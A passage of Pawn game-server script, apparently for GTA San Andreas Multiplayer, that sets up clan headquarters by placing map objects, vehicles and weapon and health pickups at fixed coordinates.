	CreateSObject_HQ(18259, -2013.412598, -771.421997, 30.353210, 0.0000, 0.0000, 270.0001);
	CreateSObject_HQ(14805, -2018.600098, -771.855347, 31.159546, 0.0000, 0.0000, 0.0000);
	CreateSObject_HQ(14640, -2008.457031, -772.670959, 30.993694, 0.0000, 0.0000, 1.6415);
	CreateSObject_HQ(12950, -2005.095947, -828.621094, 32.427128, 0.0000, 0.0000, 90.0000);
	CreateSObject_HQ(17324, -1939.553101, -858.673462, 29.986303, 0.0000, 0.0000, 270.0000);
	CreateSObject_HQ(12839, -1964.604980, -851.740784, 33.820797, 0.0000, 0.0000, 90.0000);
	CreateSObject_HQ(11544, -1960.860718, -852.521240, 35.528328, 0.0000, 0.0000, 180.0000);
	CreateSObject_HQ(8354, -2087.265625, -856.704407, 65.902565, 0.0000, 0.0000, 0.0000);
	CreateSObject_HQ(12950, -2021.835327, -828.585205, 68.133858, 0.0000, 0.0000, 270.0000);
	CreateSObject_HQ(16771, -2086.997314, -948.233582, 72.429390, 0.0000, 0.0000, 0.0000);
	CreateSObject_HQ(4874, -2078.897461, -775.169739, 67.493088, 0.0000, 0.0000, 270.0000);
	CreateSObject_HQ(8210, -1864.996948, -740.298767, 32.902626, 0.0000, 0.0000, 270.0000);
	CreateSObject_HQ(8147, -2069.189697, -709.754822, 34.124466, 0.0000, 0.0000, 90.0000);
	CreateSObject_HQ(6865, -1988.125610, -706.724854, 39.858330, 0.0000, 0.0000, 225.0000);
	CreateSObject_HQ(3472, -1979.463013, -845.153137, 31.541288, 0.0000, 0.0000, 33.7500);
	CreateSObject_HQ(11490, -2113.482666, -991.189514, 31.167557, 0.0000, 0.0000, 180.0000);
	CreateSObject_HQ(11491, -2113.597900, -980.142273, 32.520859, 0.0000, 0.0000, 180.0000);
	CreateSObject_HQ(12929, -2080.623047, -834.378296, 31.162220, 0.0000, 0.0000, 180.0000);
	CreateSObject_HQ(15035, -2112.446777, -989.730835, 32.677986, 0.0000, 0.0000, 270.0000);
	CreateSObject_HQ(8493, -2012.824829, -818.532349, 47.951942, 0.0000, 0.0000, 0.0000,1,-2012.824829, -818.532349, 83.626953);
	CreateSObject_HQ(3279, -1998.713379, -724.874634, 30.989817, 0.0000, 0.0000, 0.0000,1,-1998.713379, -724.874634, 14.039837);
	CreateSObject_HQ(980, -1951.424194, -858.578918, 32.821770, 0.0000, 0.0000, 90.0000,1,-1951.424194, -858.578918, 27.921761);
	CreateSObject_HQ(9241, -2017.442139, -975.888367, 30.405724, 0.0000, 0.0000, 180.0000,1,-2017.442139, -975.888367, 613.980835);
	CreateSObject_HQ(16409, -1882.602295, -857.888794, 30.995819, 0.0000, 0.0000, 0.0000,1,-1882.602295, -857.888794, 45.070854);
	CreateSObject_HQ(971, -2051.247803, -857.356323, 31.216545, 270.6186, 0.0000, 0.0000,1,-2051.247803, -857.356323, 65.841461);
	CreateSObject_HQ(980, -1987.692505, -709.677856, 33.454597, 0.0000, 0.0000, 0.0000,1,-1987.692505, -709.677856, 27.904579);
	CreatePickupEx(366,2,-1943.8262,-864.3306,32.2188);
	CreatePickupEx(350,2,-1940.8762,-864.3939,32.2188);
	CreatePickupEx(351,2,-1937.9082,-864.3234,32.2266);
	CreatePickupEx(339,2,-1934.8809,-864.3397,32.2188);
	CreatePickupEx(358,2,-1931.5615,-864.3680,32.1836);
	CreatePickupEx(348,2,-1929.3944,-864.3093,32.1719);
	CreatePickupEx(372,2,-1929.1703,-853.8738,32.0156);
	CreatePickupEx(1242,2,-1932.1031,-853.3661,32.2034);
	CreatePickupEx(1240,2,-1934.9602,-853.3210,32.2266);
	CreatePickupEx(341,2,-1937.6952,-853.2777,32.2266);
	CreatePickupEx(365,2,-1940.7675,-853.2291,32.2266);
	CreatePickupEx(342,2,-1943.7935,-853.2971,32.2266);
	CreateVehicleEx(409,-2076.7844,-834.3585,31.9677,269.3949,6,1); // LoL1
	CreateVehicleEx(409,-1966.6223,-864.2311,32.0183,89.4313,6,1); // LoL2
	CreateVehicleEx(487,-2016.8660,-975.6322,32.4098,88.2850,6,1); // LoL3
	CreateVehicleEx(424,-1896.3722,-756.8607,31.8049,91.4750,6,1); // LoL4
	CreateVehicleEx(429,-1896.8041,-763.0754,31.7031,89.3489,6,1); // LoL5
	CreateVehicleEx(431,-1970.6792,-996.3201,32.3001,90.5006,6,1); // LoL6
	CreateVehicleEx(451,-1896.9988,-769.0818,31.7299,91.3904,6,1); // LoL7
	CreateVehicleEx(447,-2050.6594,-969.7608,32.1918,269.8904,6,1); // LoL8
	CreateVehicleEx(451,-2125.0144,-962.1381,31.7305,269.3120,6,1); // LoL9
	CreateVehicleEx(506,-2124.7410,-956.2448,31.7023,270.3427,6,1); // LoL10
	CreateVehicleEx(457,-2003.5179,-771.3975,31.7986,180.1768,6,1); // LoL11
	CreateVehicleEx(457,-1968.9423,-797.5876,31.8533,126.1630,6,1); // LoL12
	CreateVehicleEx(476,-2086.8743,-807.6171,67.6332,180.3055,6,1); // LoL13
	CreateVehicleEx(471,-2125.5286,-950.3391,31.4940,269.7775,6,1); // LoL14
	CreateVehicleEx(460,-2021.5031,-952.1282,32.1477,0.4391,6,1); // LoL15
	CreateVehicleEx(487,-2080.9092,-758.3843,68.1377,90.6024,6,1); // LoL16
	CreateVehicleEx(511,-2085.9106,-956.2094,68.2499,358.6573,6,1); // LoL17
	CreateVehicleEx(539,-2068.5320,-815.5223,66.2628,268.9670,6,1); // LoL18
	CreateVehicleEx(593,-1879.9026,-962.8227,32.4851,358.8951,6,1); // LoL19
	CreateVehicleEx(593,-2140.9832,-969.0129,32.4851,358.0446,6,1); // LoL20
	    // SaR
	loadClans = "SaR";
	CreateSObject_HQ(972, -1652.347656, 1212.314941, 20.153131, 0.0000, 0.0000, 45.0000,1,-1652.347656, 1212.314941, 12.753164);
	CreateSObject_HQ(1966, -1642.972534, 1204.135742, 22.758320, 0.8594, 269.7591, 252.7340);
	CreateSObject_HQ(1966, -1642.881958, 1204.180786, 15.440022, 0.0000, 270.6186, 253.5161);
	CreateSObject_HQ(10154, -1642.994873, 1204.052490, 9.038023, 0.0000, 0.0000, 341.7972,1,-1642.994873, 1204.052490, 13.113010);
	CreateSObject_HQ(14467, -1663.661499, 1216.654175, 15.355669, 0.0000, 0.0000, 0.0000);
	CreateSObject_HQ(10281, -1662.726929, 1225.963379, 23.223545, 0.0000, 0.0000, 315.0000);
	CreateSObject_HQ(14399, -1662.754639, 1205.172852, 20.155304, 0.0000, 0.0000, 0.0000);
	CreateSObject_HQ(16662, -1684.579590, 1214.423462, 13.835596, 0.0000, 0.0000, 22.5000);
	CreateSObject_HQ(14813, -1665.131714, 1227.154175, 13.162890, 0.0000, 0.0000, 315.0000);
	CreateSObject_HQ(972, -1652.041748, 1211.912720, 12.668756, 0.0000, 0.0000, 45.0000);
	CreateSObject_HQ(13607, -1592.036987, 1200.366455, 24.773726, 0.0000, 0.0000, 0.0000);
	CreateSObject_HQ(7388, -1665.205200, 1228.422729, 31.899940, 0.0000, 0.0000, 0.0000);
	CreateSObject_HQ(10830, -1642.426392, 1241.317383, 11.994005, 0.0000, 0.0000, 180.0000);
	CreateSObject_HQ(10828, -1621.547241, 1252.468018, 12.332132, 0.0000, 0.0000, 135.0000);
	CreateSObject_HQ(10841, -1635.645996, 1266.854858, 13.461315, 0.0000, 0.0000, 315.0000,1,-1635.645996, 1266.854858, 3.886311);
	CreateSObject_HQ(5741, -1659.869995, 1241.850098, 20.215206, 0.0000, 0.0000, 315.0000);
	CreateSObject_HQ(1655, -1666.923950, 1267.617065, 21.552254, 0.0000, 0.0000, 44.1406);
	CreateSObject_HQ(8483, -1668.885620, 1242.567505, 25.993303, 0.0000, 0.0000, 11.2500);
	CreateSObject_HQ(13749, -1647.674072, 1221.563232, 25.479193, 0.0000, 0.0000, 101.1727);
	CreateSObject_HQ(3515, -1647.726807, 1286.184204, 21.629293, 0.0000, 0.0000, 0.0000);
	CreateSObject_HQ(3885, -1613.526733, 1246.480225, 19.789438, 0.0000, 0.0000, 303.7500,1,-1613.526733, 1246.480225, 41.614433);
	CreateSObject_HQ(8356, -1666.631592, 1323.730225, 42.136185, 0.0000, 0.0000, 228.5151);
	CreateSObject_HQ(9833, -1634.526733, 1248.786255, 23.432793, 0.0000, 0.0000, 0.0000);
	CreateSObject_HQ(14553, -1718.330322, 1247.951782, 63.278515, 40.3935, 2.5783, 92.5783);
	CreateSObject_HQ(4726, -1690.508789, 1212.350952, 30.936655, 0.0000, 0.0000, 357.6537);
	CreateSObject_HQ(14826, -1636.326416, 1270.877197, 21.054705, 0.0000, 0.0000, 135.0000);
	CreateVehicleEx(487,-1680.2395,1216.5631,33.4732,177.7100,86,6); // mave1
	CreateVehicleEx(487,-1691.3796,1208.9097,33.4306,264.6938,86,6); // mave2
	CreateVehicleEx(487,-1689.2965,1222.1423,33.4465,267.7292,86,6); // mave3
	CreateVehicleEx(541,-1636.6975,1272.2167,21.0034,223.1527,86,6); // bullet
	CreateVehicleEx(560,-1640.5133,1213.3856,6.8487,352.2073,86,6); // sultan
	CreateVehicleEx(560,-1669.9803,1242.2107,6.8090,262.6552,86,6); // sultan2
	CreateVehicleEx(411,-1636.4462,1216.4183,6.7706,344.9160,86,6); // infernus1
	CreateVehicleEx(411,-1666.7294,1246.1445,6.7573,268.7290,86,6); // infernus2
	CreateVehicleEx(534,-1669.9127,1218.6205,6.9746,217.6174,86,6); // remington
	CreateVehicleEx(445,-1662.9795,1249.7239,6.9194,268.6426,86,6); // bmw1
	CreateVehicleEx(405,-1632.3179,1220.6873,6.9164,348.1747,86,6); // bmw2
	CreateVehicleEx(536,-1659.0830,1253.4978,6.8397,262.5894,86,6); // blade
	CreateVehicleEx(506,-1656.3801,1256.9520,6.8483,259.8994,86,6); // supergt
	CreateVehicleEx(429,-1653.8009,1260.1444,6.7188,263.5302,86,6); // banshee
	CreateVehicleEx(490,-1668.2719,1206.9570,7.3792,318.2200,86,6); // fbirun
	CreateVehicleEx(500,-1647.5990,1204.4340,13.7839,1.2228,86,6); // jeep42
	CreateVehicleEx(482,-1661.2081,1228.9707,7.3080,317.2645,86,6); // musicar
	CreateVehicleEx(406,-1630.9745,1252.3589,8.6425,135.1643,86,6); // bigmasa
	CreateVehicleEx(522,-1666.4293,1226.4617,20.7161,225.9134,86,6); // nrg1
	CreateVehicleEx(522,-1667.5807,1224.8080,20.7235,229.8187,86,6); // nrg2
	CreateVehicleEx(522,-1668.9471,1223.6545,20.7047,229.5792,86,6); // nrg3
	CreateVehicleEx(522,-1650.1733,1203.6321,20.7022,354.4152,86,6); // nrg4
	CreateVehicleEx(522,-1648.5074,1203.7606,20.7073,355.2039,86,6); // nrg5
	CreateVehicleEx(522,-1646.7952,1203.7733,20.7200,359.9893,86,6); // nrg6
	CreateVehicleEx(592,-1615.2621,1279.5140,44.3444,49.3150,86,6); // bigpla
	CreateVehicleEx(521,-1652.6738,1203.5828,20.7039,2.7026,86,6); // fcr
	CreateVehicleEx(481,-1670.2404,1222.5104,20.6692,228.6721,86,6); // bmx
	CreateVehicleEx(415,-1628.5402,1224.3658,6.9222,351.3960,86,6); // cheetah
	CreateVehicleEx(559,-1624.9163,1227.5815,6.7327,353.0592,86,6); // jester
	CreateVehicleEx(579,-1621.1837,1232.2394,6.9662,358.4977,86,6); // jeep
	CreatePickupEx( 1242, 2, -1663.8903,1205.3804,21.1563 ); //Armour
	CreatePickupEx( 1240, 2, -1665.3806,1205.3950,21.1563 ); //health
	CreatePickupEx( 351, 2, -1666.7043,1205.3950,21.1563 ); //Combat
	CreatePickupEx( 372, 2, -1668.0848,1205.3950,21.1563 ); //tec9
	CreatePickupEx( 356, 2, -1669.7352,1205.3950,21.1563 ); //M4
	CreatePickupEx( 358, 2, -1671.5820,1205.3950,21.1563); //Sniper
	CreatePickupEx( 342, 2, -1670.0345,1203.3192,21.1563 ); //rimonim
	CreatePickupEx( 365, 2, -1666.2742,1203.2699,21.1563 ); //spray
	CreatePickupEx( 335, 2, -1664.7340,1203.2498,21.1563 ); //Knife
	CreatePickupEx( 371, 2, -1671.5966,1203.4220,21.1563 ); //parachute
	CreatePickupEx( 1242, 2, -1605.2432,1237.3152,22.2347 ); //Armour
	CreatePickupEx( 1240, 2, -1607.7688,1236.4396,22.2347 ); //health
	CreatePickupEx( 351, 2, -1602.5249,1238.1211,22.2347 ); //Combat
	CreatePickupEx( 372, 2, -1599.7578,1238.9414,22.2347 ); //tec9
	CreatePickupEx( 339, 2, -1668.1273,1203.3361,21.1563 ); //katana
	dbg(11,"6b");
		// LorD
	loadClans = "LorD";
	CreateSObject_HQ(3749, -1519.148926, 920.128418, 11.170917, 0.0000, 0.0000, 89.1406);
	CreateSObject_HQ(3749, -1485.914063, 1015.216187, 11.490678, 0.0000, 0.0000, 180.0000);
	CreateSObject_HQ(8210, -1519.825562, 1016.906860, 8.538538, 0.0000, 0.0000, 180.0000);
	CreateSObject_HQ(8148, -1521.849609, 1010.482300, 7.222389, 0.0000, 0.0000, 180.8594);
	CreateSObject_HQ(8210, -1523.088379, 882.823181, 9.288527, 0.0000, 0.0000, 265.7028);
	CreateSObject_HQ(8210, -1525.408447, 852.083130, 9.288527, 0.0000, 0.0000, 265.7028);
	CreateSObject_HQ(8210, -1500.109863, 824.382446, 9.138529, 0.0000, 0.0000, 0.0000);
	CreateSObject_HQ(3437, -1491.964722, 974.450073, 15.500294, 0.0000, 89.3814, 270.0000);
	CreateSObject_HQ(3437, -1491.939453, 979.700134, 20.249992, 0.0000, 0.0000, 270.0000);
	CreateSObject_HQ(3437, -1491.964478, 956.509705, 20.153404, 0.0000, 0.0000, 270.0000);
	CreateSObject_HQ(3437, -1491.990234, 949.655151, 24.783167, 0.0000, 269.7592, 270.0000);
	CreateSObject_HQ(3437, -1492.015259, 949.776489, 15.454268, 0.0000, 269.7592, 270.0000);
	CreateSObject_HQ(3437, -1491.989502, 944.525452, 20.196400, 0.0000, 0.0000, 270.0000);
	CreateSObject_HQ(3437, -1491.889404, 901.750061, 19.930794, 0.0000, 0.0000, 270.0000);
	CreateSObject_HQ(3437, -1492.089600, 895.732361, 24.496065, 0.0000, 269.7592, 270.0000);
	CreateSObject_HQ(3437, -1491.914429, 895.556152, 21.660849, 0.0000, 250.8517, 274.2972);
	CreateSObject_HQ(3437, -1492.065796, 895.320068, 16.528143, 0.0000, 311.0122, 274.2972);
	CreateSObject_HQ(3437, -1491.964966, 877.971619, 20.045313, 0.0000, 0.0000, 90.0000);
	CreateSObject_HQ(3437, -1492.014771, 872.589355, 22.009325, 0.0000, 58.4416, 90.0000);
	CreateSObject_HQ(3437, -1492.064819, 873.241577, 16.690197, 0.0000, 108.2889, 90.0000);
	CreateSObject_HQ(3666, -1492.314819, 886.631531, 14.878128, 0.0000, 0.0000, 0.0000);
	CreateSObject_HQ(3666, -1492.415161, 863.407593, 14.814758, 0.0000, 0.0000, 0.0000);
	CreateSObject_HQ(3666, -1492.240479, 911.138000, 14.741535, 0.0000, 0.0000, 0.0000);
	CreateSObject_HQ(3666, -1492.314819, 938.715942, 14.810688, 0.0000, 0.0000, 0.0000);
	CreateSObject_HQ(3666, -1492.364868, 962.411133, 14.765207, 0.0000, 0.0000, 0.0000);
	CreateSObject_HQ(3666, -1492.389893, 985.578857, 14.794439, 0.0000, 0.0000, 0.0000);
	CreateSObject_HQ(6300, -1509.873047, 1047.618774, -7.371798, 0.0000, 0.0000, 90.0000);
	CreateSObject_HQ(8483, -1492.589233, 1042.454468, 6.162499, 0.0000, 1.7189, 356.5623);
	CreateSObject_HQ(3524, -1486.477173, 1038.835693, 5.222194, 30.9397, 0.0000, 80.7008);
	CreateSObject_HQ(3524, -1486.289063, 1042.865601, 5.218399, 30.9397, 0.0000, 97.0301);
	CreateSObject_HQ(622, -1506.814453, 1017.944702, 0.102801, 0.0000, 0.0000, 303.7500);
	CreateSObject_HQ(622, -1505.653687, 1070.175903, 0.228915, 0.0000, 0.0000, 236.2501);
	CreateSObject_HQ(3525, -1495.199585, 926.122192, 26.890356, 0.0000, 0.0000, 270.0000);
	CreateSObject_HQ(3525, -1495.159424, 924.765137, 26.840357, 0.0000, 0.0000, 270.0000);
	CreateSObject_HQ(3525, -1495.234009, 915.518738, 26.865372, 0.0000, 0.0000, 270.0000);
	CreateSObject_HQ(3525, -1495.175171, 914.145264, 26.915371, 0.0000, 0.0000, 270.0000);
	CreateSObject_HQ(3528, -1494.270386, 920.295715, 14.849451, 0.0000, 0.0000, 176.5622);
	CreateSObject_HQ(13607, -1400.436279, 915.832825, 463.186218, 0.0000, 0.0000, 334.0623);
	CreateSObject_HQ(14467, -1439.408325, 908.329468, 461.655884, 0.0000, 0.0000, 191.2501);
	CreateSObject_HQ(12950, -1382.412598, 948.317505, 461.078613, 0.0000, 0.0000, 146.2500);
	CreateSObject_HQ(3277, -1386.679443, 942.167114, 463.968658, 0.0000, 0.0000, 309.8434);
	CreateSObject_HQ(14877, -1472.928467, 1024.768066, -0.548329, 352.2651, 358.2811, 270.0000);
	CreateSObject_HQ(4874, -1408.203369, 990.855652, 26.889040, 0.0000, 0.0000, 179.7587);
	CreateSObject_HQ(987, -1520.955078, 926.121582, 6.187500, 0.0000, 0.0000, 269.1406,1,-1521.221924, 926.266785, -0.187499);
	CreateSObject_HQ(987, -1480.286621, 1017.076599, 6.187500, 0.0000, 0.0000, 180.0000,1,-1480.297607, 1017.110596, 0.014061);
	CreateSObject_HQ(8210, -1448.190063, 1044.779053, 3.198383, 0.0000, 0.0000, 90.0001,1,-1448.669922, 1100.350342, 2.924339);
	CreateSObject_HQ(5152, -1493.387451, 929.324158, 6.110681, 0.0000, 24.0642, 270.8595,1,-1493.715698, 929.322144, 26.196030);
	CreateSObject_HQ(10810, -1454.106689, 916.442139, 22.367168, 0.0000, 0.0000, 199.9217,1,-1453.495605, 915.666626, 454.442108);
	CreateVehicleEx(490,-1517.4124,905.2524,7.3070,301.6844,6,6); //
	CreateVehicleEx(495,-1518.1760,900.2973,7.5568,308.6919,6,6); //
	CreateVehicleEx(500,-1517.5062,896.0426,7.3242,307.9038,6,6); //
	CreateVehicleEx(534,-1515.9949,827.8089,6.9393,323.5390,6,6); //
	CreateVehicleEx(535,-1507.8961,827.9505,6.9736,0.5549,6,6); //
	CreateVehicleEx(535,-1501.8978,828.2381,6.9743,2.6614,6,6); //
	CreateVehicleEx(534,-1495.5432,828.2856,6.9590,43.2089,6,6); //
	CreateVehicleEx(463,-1436.1536,827.0874,6.6938,24.3622,6,6); //
	CreateVehicleEx(463,-1434.6454,828.9250,6.6899,69.9226,6,6); //
	CreateVehicleEx(602,-1444.9043,851.0181,6.9387,269.4356,6,6); //
	CreateVehicleEx(603,-1444.6807,857.6518,6.9333,269.7681,6,6); //
	CreateVehicleEx(560,-1444.9788,877.2153,6.8804,270.0538,6,6); //
	CreateVehicleEx(545,-1445.3623,882.2111,6.9390,271.4607,6,6); //
	CreateVehicleEx(429,-1422.2510,900.5581,6.8663,63.3698,6,6); //
	CreateVehicleEx(429,-1422.4332,905.1947,6.8544,128.6323,6,6); //
	CreateVehicleEx(451,-1422.4786,913.7058,6.9139,90.6022,6,6); //
	CreateVehicleEx(451,-1422.1714,920.3593,6.9107,89.6425,6,6); //
	CreateVehicleEx(402,-1422.4084,928.4521,7.0282,43.9530,6,6); //
	CreateVehicleEx(402,-1422.4069,935.6252,6.9602,124.8443,6,6); //
	CreateVehicleEx(548,-1387.2631,994.2141,28.8318,2.0859,0,0); //
	CreateVehicleEx(500,-1516.9315,943.0833,7.3299,229.3620,6,6); //
	CreateVehicleEx(495,-1516.8384,938.3727,7.5461,229.3932,6,6); //
	CreateVehicleEx(490,-1516.5599,933.4360,7.3127,233.1624,6,6); //
	CreateVehicleEx(469,-1487.3630,993.3630,26.6921,90.9726,6,6); //
	CreateVehicleEx(469,-1486.5688,847.1219,26.6902,89.0143,0,0); //
	CreateVehicleEx(452,-1468.8573,1064.3837,-0.9523,271.9319,6,6); //
	CreateVehicleEx(460,-1465.8201,1042.9998,1.5272,280.4695,6,6); //
	CreateVehicleEx(484,-1463.8240,1023.5170,0.2013,273.0462,6,6); //
	CreatePickupEx( 1242, 2, -1438.1073,926.9886,460.6472 ); //Armour
	CreatePickupEx( 1240, 2,-1439.4968,922.4243,460.6472 ); //health
	CreatePickupEx( 1242, 2, -1487.0787,915.3704,30.6667 ); //Armour
	CreatePickupEx( 1240, 2, -1487.0858,924.8136,30.6667 ); //health
	CreatePickupEx( 351, 2, -1473.7666,924.8717,30.6667 ); //Combat
	CreatePickupEx( 341, 2, -1473.5491,915.2885,30.6667 ); //chainsaw
	dbg(11,"6d");
	    // LaS
	loadClans = "LaS";
	CreatePickupEx(1240,2,363.0381,-2779.5398,-37.7500);
	CreatePickupEx(1242,2,368.7900,-2779.1016,-37.7500);
	CreatePickupEx(355,2,366.1250,-2778.3379,-37.7500);
	CreatePickupEx(372,2,369.1724,-2774.4248,-37.7500);
	CreatePickupEx(350,2,363.6251,-2774.5908,-37.7500);
	CreateSObject_HQ(980, 222.122696, -2732.962158, -35.976608, 0.000000, 0.000000, 0.000000,1,222.249863, -2731.686523, -29.956375); //
	CreateSObject_HQ(3749, 222.167999, -2732.418701, -32.891586, 0.000000, 0.000000, 0.000000); //
	CreateSObject_HQ(8263, 213.242462, -2793.200439, -35.648972, 0.000000, 0.000000, -89.999981276); //
	CreateSObject_HQ(9241, 358.525116, -2839.510742, -36.691101, 0.000000, 0.000000, -92.5782913541); //
	CreateSObject_HQ(18284, 222.108246, -2846.760742, -35.805161, 0.000000, 0.000000, -89.999981276); //
	CreateSObject_HQ(14738, 365.748169, -2770.006104, -36.132816, 0.000000, 0.000000, -89.063195281); //
	CreateSObject_HQ(1608, 230.458221, -2722.484131, -36.597343, 0.000000, 0.000000, 0.000000); //
	CreateSObject_HQ(1608, 214.584991, -2723.819824, -36.597343, 0.000000, 0.000000, 0.000000); //
	CreateSObject_HQ(2634, 367.588409, -2759.832275, -37.605770, 0.000000, 0.000000, -359.140603003); //
	CreateSObject_HQ(4186, 307.009918, -2764.213379, -31.552185, 0.000000, 0.000000, 0.000000); //
	CreateSObject_HQ(18259, 291.455994, -2844.842285, -36.401154, 0.000000, 0.859436692696, -89.999981276); //
	CreateSObject_HQ(3528, 325.731201, -2732.291016, -19.984028, 0.000000, 0.000000, -281.249970135); //
	CreateSObject_HQ(16782, 297.042938, -2847.522705, -35.162266, 0.000000, 0.000000, -225.000010486); //
	CreateSObject_HQ(3279, 263.977234, -2743.346436, -38.501724, 0.000000, 0.000000, -146.249940926); //
	CreateSObject_HQ(14780, 285.886536, -2846.227539, -35.469189, 0.000000, 0.000000, 0.000000); //
	CreateSObject_HQ(8148, 292.624329, -2852.095459, -35.648972, 0.000000, 0.000000, -89.999981276); //
	CreateSObject_HQ(8150, 371.440582, -2788.920654, -35.648972, 0.000000, 0.000000, -89.999981276); //
	CreateSObject_HQ(8147, 300.742615, -2732.061035, -35.648972, 0.000000, 0.000000, -88.2811078906); //
	CreateVehicleEx(502,217.1472,-2847.4875,-37.8573,357.8274,2,1); //
	CreateVehicleEx(411,227.4689,-2847.4226,-38.0229,359.7003,2,0); //
	CreateVehicleEx(451,222.1436,-2847.0017,-38.0438,0.4430,2,6); //
	CreateVehicleEx(506,284.3319,-2791.7688,-37.7088,239.7819,2,1); //
	CreateVehicleEx(506,322.5116,-2791.7585,-37.7625,109.0659,2,1); //
	CreateVehicleEx(522,297.7016,-2833.3345,-38.1792,6.9210,2,6); //
	CreateVehicleEx(444,305.1529,-2768.3950,-36.7121,180.7276,2,6); //
	CreateVehicleEx(437,349.0280,-2761.6790,-37.4508,180.2971,2,6); //
	CreateVehicleEx(539,279.5541,-2843.1987,-38.3899,5.4967,2,6); //
	CreateVehicleEx(560,307.4714,-2846.1018,-38.0444,5.9904,2,6); //
	CreateVehicleEx(568,314.8755,-2847.2119,-37.8855,7.0336,0,0); //
	CreateVehicleEx(487,359.9698,-2841.6450,-34.6829,17.3593,2,2); //
	dbg(11,"6e");
	    // LaG
	loadClans = "LaG";
	CreateVehicleEx(493,809.8970,-2075.0159,-0.1499,2.1329,2,10); //
	CreateVehicleEx(460,842.6143,-2095.2712,1.6872,273.6733,2,10); //
	CreateVehicleEx(411,831.9241,-1831.2510,12.0519,182.0941,2,10); //
	CreateVehicleEx(490,826.8695,-1833.2399,12.5421,178.5583,2,10); //
	CreateVehicleEx(411,821.6277,-1831.6362,12.2026,178.7804,10,2); //
	CreateVehicleEx(415,823.0403,-1890.2664,12.6392,209.8191,2,10); //
	CreateVehicleEx(534,823.1786,-1933.3718,12.5902,214.6833,2,10); //
	CreateVehicleEx(522,851.3660,-1943.8566,12.4306,92.4957,2,10); //
	CreateVehicleEx(522,821.5472,-1952.6829,12.4314,270.7265,10,2); //
	CreateVehicleEx(506,849.6949,-1964.7191,12.5732,134.3629,2,10); //
	CreateVehicleEx(541,822.7956,-1971.1813,12.4937,224.3750,2,10); //
	CreateVehicleEx(494,848.5985,-2005.5017,12.7745,137.1541,2,10); //
	CreateVehicleEx(431,823.5312,-2007.2321,12.9757,181.3929,2,10); //
	CreateVehicleEx(487,841.5017,-2023.1398,13.0454,143.7877,2,10); //
	CreateVehicleEx(513,834.5593,-1860.3286,13.4155,180.7144,2,10); //
	CreateSObject_HQ(8149, 853.029236, -1907.096924, 14.842484, 0.0000, 0.0000, 0.0000);
	CreateSObject_HQ(8149, 853.029236, -1996.478882, 14.968214, 0.0000, 0.0000, 0.0000);
	CreateSObject_HQ(8149, 819.859863, -1899.749878, 14.968216, 0.0000, 0.0000, 180.0000);
	CreateSObject_HQ(8149, 819.870544, -1989.033569, 14.968216, 0.0000, 0.0000, 180.0000);
	CreateSObject_HQ(3749, 842.798584, -1830.276978, 16.948153, 0.0000, 0.0000, 0.0000);
	CreateSObject_HQ(8947, 826.953979, -1840.515625, 14.217487, 0.0000, 0.0000, 0.0000);
	CreateSObject_HQ(7657, 829.534729, -1828.325317, 19.020559, 0.0000, 0.0000, 0.0000);
	CreateSObject_HQ(13749, 838.394958, -2074.073242, 5.174784, 0.0000, 0.0000, 326.2500);
	CreateSObject_HQ(8357, 836.631470, -1934.773193, 19.668751, 179.5182, 0.0000, 0.0000, 1, 872.506042, -1934.756348, 19.655436);
	CreateSObject_HQ(980, 842.804443, -1830.500366, 13.973446, 0.0000, 0.0000, 0.0000, 1, 842.795715, -1830.530029, 8.509386);
	CreateSObject_HQ(4563, 831.869812, -2071.130371, -153.653656, 0.0000, 0.0000, 0.0000, 1, 831.893677, -2071.219238, -172.245667);
	CreatePickupEx(1240,2,842.8152,-2054.0620,3.1067);
	CreatePickupEx(1242,2,838.8190,-2053.5081,3.1077);
	CreatePickupEx(339,2,834.6993,-2052.9377,3.1087);
	CreatePickupEx(348,2,830.4421,-2052.3474,3.1098);
	CreatePickupEx(350,2,834.3303,-2049.0522,3.1088);
	CreatePickupEx(352,2,839.6907,-2048.0952,3.1075);
	CreatePickupEx(356,2,844.9214,-2047.5688,3.1062);
	CreatePickupEx(358,2,848.9659,-2047.1615,3.1052);
	    // SmP
	loadClans = "SmP";
	CreateSObject_HQ(1242, -2186.155273, 2419.152100, 4.451106, 0.0000, 0.0000, 11.2500);
	CreateSObject_HQ(5837, -2261.869873, 2278.919922, 5.705034, 0.0000, 0.0000, 0.0004);
	CreateSObject_HQ(3627, -2268.327881, 2320.853271, 7.659700, 0.0000, 0.0000, 0.0000);
	CreateSObject_HQ(971, -2221.651367, 2360.965576, 7.504299, 0.0000, 0.0000, 225.0002);
	CreateSObject_HQ(14467, -2262.068604, 2279.140137, 10.145558, 0.0000, 0.0000, 146.2509);
	CreateSObject_HQ(3279, -2224.127930, 2351.169189, 3.867792, 0.0000, 0.0000, 0.0000);
	CreateSObject_HQ(971, -2267.992188, 2365.466064, 7.789228, 0.0000, 0.0000, 67.5002);
	CreateSObject_HQ(971, -2264.573730, 2373.707520, 7.757006, 0.0000, 0.0000, 67.5002);
	CreateSObject_HQ(971, -2259.768066, 2380.872070, 7.736016, 0.0000, 0.0000, 45.0003);
	CreateSObject_HQ(971, -2254.904541, 2388.025635, 7.745882, 0.0000, 0.0000, 67.5003);
	CreateSObject_HQ(971, -2252.616211, 2392.585693, 7.280992, 0.0000, 0.0000, 67.5002);
	CreateSObject_HQ(971, -2304.782471, 2296.388916, 7.254298, 0.0000, 0.0000, 0.0000);
	CreateSObject_HQ(971, -2281.432861, 2341.344482, 7.524328, 0.0000, 0.0000, 258.7500);
	CreateSObject_HQ(3749, -2276.705078, 2354.438965, 9.746052, 0.0000, 0.0000, 236.2501);
	CreateSObject_HQ(3550, -2273.599854, 2360.514160, 6.260883, 0.0000, 0.0000, 326.2500);
	CreateSObject_HQ(3550, -2281.347900, 2348.982178, 6.246456, 0.0000, 0.0000, 326.2500);
	CreateSObject_HQ(13607, -2244.422363, 2326.250244, 50.802475, 0.0000, 0.0000, 0.0000);
	CreateSObject_HQ(1506, -2263.651123, 2280.406250, 4.322043, 0.0000, 0.0000, 0.0000,1,-2199.111328, 2328.343750, 5.299648);
	CreateSObject_HQ(986, -2277.846436, 2355.166748, -1.536569, 0.0000, 0.0000, 236.2501,1,-2277.718262, 2355.093018, 5.647118);
	CreateSObject_HQ(2669, -2199.111328, 2328.343750, 5.299648, 0.0000, 0.0000, 277.7349,1,-2200.556641, 2330.766113, 48.349709);
	CreateVehicleEx(487,-2223.4922,2325.3196,7.7241,179.6249,11,1); //
	CreateVehicleEx(487,-2231.7351,2328.8525,7.7246,356.7991,11,1); //
	CreateVehicleEx(522,-2255.4163,2278.8093,4.5552,354.4716,11,3); //
	CreateVehicleEx(522,-2253.0291,2279.0779,4.5461,3.5923,11,1); //
